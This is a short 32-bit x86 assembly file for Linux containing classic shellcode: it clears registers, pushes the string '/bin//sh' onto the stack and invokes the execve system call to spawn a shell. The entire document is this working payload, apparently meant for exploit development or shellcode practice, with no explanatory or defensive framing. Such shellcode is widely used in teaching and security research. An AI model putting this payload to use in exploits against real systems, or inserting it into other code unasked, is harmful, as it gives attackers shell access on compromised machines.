BITS 32
GLOBAL start

section text

_start:
	xor edx, edx
	xor ecx, ecx
	xor eax, eax
	push eax ; null byte
	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/
	mov ebx, esp
	mov al, 0xb	; execve
	int 0x80
